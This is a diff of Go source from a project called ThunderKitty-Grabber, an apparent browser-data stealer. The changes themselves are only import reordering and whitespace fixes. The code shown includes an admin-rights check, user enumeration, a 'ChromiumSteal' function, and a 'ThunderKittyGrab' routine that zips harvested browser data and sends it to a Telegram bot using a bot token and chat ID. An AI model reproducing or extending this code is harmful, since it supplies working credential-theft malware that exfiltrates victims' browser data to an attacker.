@@ -1,16 +1,17 @@
 package browsers
 
 import (
+	requests "ThunderKitty-Grabber/utils/telegramsend"
+	"archive/zip"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"os"
 	"path/filepath"
 	"strings"
-	"archive/zip"
 	"syscall"
+
 	"github.com/shirou/gopsutil/disk"
-	"io/ioutil"
-	"ThunderKitty-Grabber/utils/telegramsend"
 )
 
 var (
@@ -29,7 +30,6 @@ func IsElevated() bool {
 	ret, _, _ := syscall.NewLazyDLL("shell32.dll").NewProc("IsUserAnAdmin").Call()
 	return ret != 0
 }
-
 
 func GetUsers() []string {
 	if !IsElevated() {
@@ -60,6 +60,7 @@ func GetUsers() []string {
 
 	return users
 }
+
 ///
 
 func IsDir(path string) bool {
@@ -164,8 +165,8 @@ func Zip(dirPath string, zipName string) error {
 
 	return nil
 }
-//
 
+//
 
 func ChromiumSteal() []Profile {
 	var prof []Profile
@@ -368,10 +369,10 @@ func ThunderKittyGrab(botToken, chatID string) {
 	}
 	defer os.Remove(tempZip)
 
-    description := fmt.Sprintf("```%s```", Tree(tempDir, ""))
+	description := fmt.Sprintf("```%s```", Tree(tempDir, ""))
 
-    if err := requests.SendToTelegram(botToken, chatID, "Browsers", description, tempZip); err != nil {
-        fmt.Println("Failed to send data to Telegram:", err)
-        return
-    }
+	if err := requests.SendToTelegram(botToken, chatID, "Browsers", description, tempZip); err != nil {
+		fmt.Println("Failed to send data to Telegram:", err)
+		return
+	}
 }
